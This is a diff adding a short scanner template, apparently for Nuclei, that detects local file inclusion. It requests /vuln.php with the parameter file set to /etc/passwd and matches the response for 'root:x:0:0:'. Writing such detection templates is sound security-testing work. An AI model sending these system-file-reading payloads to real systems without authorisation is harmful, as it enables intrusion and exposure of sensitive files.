@@ -1,0 +1,13 @@
+id: lfi
+info:
+  name: Local File Inclusion (LFI)
+  severity: high
+  tags: lfi
+requests:
+  - method: GET
+    path: /vuln.php
+    params:
+      file: "/etc/passwd"
+    matchers:
+      - type: regex
+        regex: "root:x:0:0:"
